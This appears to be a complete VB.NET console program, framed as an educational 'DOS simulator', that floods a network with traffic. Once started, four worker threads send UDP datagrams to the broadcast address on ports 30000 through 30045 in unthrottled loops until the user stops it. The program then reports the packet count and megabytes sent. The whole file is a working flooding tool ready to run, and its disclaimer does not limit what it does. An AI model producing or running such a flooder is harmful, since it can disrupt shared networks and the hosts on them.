Imports System.Net
Imports System.Threading
Module Program
    Private Count As ULong
    Private ThreadCount, MessageLen As UShort
    Private DataTransferred As Double
    Private Duration As TimeSpan
    Private StartTime As Date
    Private RunningDOS, AppRunning As Boolean
    Private Message As String
    Sub Main()
        AppRunning = True
        Console.WriteLine("WELCOME TO THE DOS SIMULATOR!" & vbCrLf & "*DISCLAIMER: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY!*" & vbCrLf)
        Console.Write("Enter preferred data message size for transmission (in bytes, less than 100): ")
        Try
            MessageLen = Console.ReadLine()
            If MessageLen > 100 Or MessageLen < 10 Then
                Throw New Exception
            Else
                Message = StrDup(MessageLen, "X")
            End If
        Catch
            Message = StrDup(2, "abcdefghijklmnopqrstuvwxyz") 'len 56
            Console.WriteLine("Error parsing input: Message set to default value of length 56.")
        End Try
        ThreadCount = 4
        Console.WriteLine(vbCrLf & "Enter DOS mode: press '1' on the keyboard")
        Console.WriteLine(vbCrLf & "Exit application: press '2' on the keyboard" & vbCrLf)
        Dim InputMonitorThread As New Thread(AddressOf CheckInput) With {.IsBackground = True}
        InputMonitorThread.Start()
        While AppRunning
            Continue While
        End While
        Console.ReadKey()
    End Sub
    Private Sub CheckInput()
        While AppRunning
            Dim KeyInfo As ConsoleKeyInfo = Console.ReadKey(True)
            If KeyInfo.Key = ConsoleKey.D1 And Not RunningDOS Then
                Console.WriteLine("Entering DOS simulation mode...")
                Console.WriteLine("Entering initialisation sequence..." & vbCrLf)
                InitialiseDOS()
            ElseIf KeyInfo.Key = ConsoleKey.D2 Then
                RunningDOS = False
                DataTransferred = Math.Round(CInt(Count) * Message.Length / 1000000, 5)
                Duration = Now - StartTime
                Console.WriteLine(vbCrLf & vbCrLf & $"Successfully exited program. Packets sent:  {Count}, Data total: {DataTransferred} MB. Duration: {Duration.TotalSeconds} seconds.")
                Console.WriteLine(vbCrLf & "THANKS FOR USING THE DOS SIMULATOR! Click any key to exit :)" & vbCrLf)
                Console.WriteLine("k:lkXWWWMMMMMMMWWNXXXXNWWMMMMMMMMWNKxcc0" & vbCrLf & "d...,cdkO0K0Odc:;,,;;,;;:ldOKK0Oxo:'..'k" & vbCrLf & "x'.........'',;:clllllc::;,''.........;0" & vbCrLf & "K:........,:looooooooooooool:,........lN" & vbCrLf & "WO,.....,cllllllllllllllllllll:'.....cKM" & vbCrLf & "MW0:...,:cccclllllllllllllclccc:....lXWM" & vbCrLf & "MMNl...,:::cccccccccccccccc:cc::'...xWMM" & vbCrLf & "MWk'...',;;;;::::cccccc::::;;;;,....;KMM" & vbCrLf & "MNl...'',;,...':loloooll;'..',;,'....xWM" & vbCrLf & "MXc..',;:cccc'  ,oxdxdl. .,ccc::;,...dWM" & vbCrLf & "MNl..';:clldl.  'dkkkko.  'ooolc:;'..xWM" & vbCrLf & "MWx..';:lloxo' .lOOkkOk:. ;ddolc:;'.,0MM" & vbCrLf & "MMXc.';clododxodOOOOOOOkddxdodol:,..dNMM" & vbCrLf & "MMW0:.,:codo;;coxkOkkkkdo:;codoc;''lXMMM" & vbCrLf & "MMMWKl,,:loddl;''......',:oxdoc;',dXWWMM" & vbCrLf & "MMMMWXkc,;:lodkxdolllloxkxdoc:,,lONMMMMM" & vbCrLf & "MMMMMWWXkl:;;:clooddddoolc:;;:oONWMMMMMM" & vbCrLf & "MMMMMMMMWNKkdlc::::::::::cldOKWWMMMMMMMM" & vbCrLf & "MMMMMMMMMMMWWNXK0OOkkOO0KXNWWWMMMMMMMMMM" & vbCrLf & "MMMMMMMMMMMMMMMWWWWWWWWWWWMMMMMMMMMMMMMM")
                AppRunning = False
            End If
        End While
    End Sub
    Private Sub InitialiseDOS()
        RunningDOS = True
        StartTime = Now
        Dim TempLst As New List(Of UInteger)
        For i As UInteger = 0 To ThreadCount - 1
            TempLst.Add(30000 + 15 * i)
            Dim Client As New Sockets.UdpClient(CInt(18000 + 15 * i)) With {.EnableBroadcast = True}
            Dim DestEP As New IPEndPoint(IPAddress.Broadcast, 30000 + 15 * i)
            ThreadPool.QueueUserWorkItem(Sub() BroadcastData(Client, DestEP), i)
        Next
        Console.WriteLine($"Targeting ports {String.Join(", ", TempLst)}. Threads now live.")
        Dim CountingThread As New Thread(AddressOf UpdateCount) With {.IsBackground = True}
        CountingThread.Start()
    End Sub
    Private Sub UpdateCount()
        Console.Write(vbCrLf)
        While RunningDOS
            Console.SetCursorPosition(0, Console.CursorTop)
            Console.Write($"Broadcast message datagrams sent: {Count}. Reminder: press '2' on the keyboard to exit...")
            Thread.Sleep(50)
        End While
    End Sub
    Private Sub BroadcastData(Client As Sockets.UdpClient, DestinationEP As IPEndPoint)
        While RunningDOS
            Try
                Dim Bytes() As Byte = System.Text.Encoding.ASCII.GetBytes(Message)
                Client.Send(Bytes, Bytes.Length, DestinationEP)
                Count += 1
            Catch
                Continue While
            End Try
        End While
    End Sub
End Module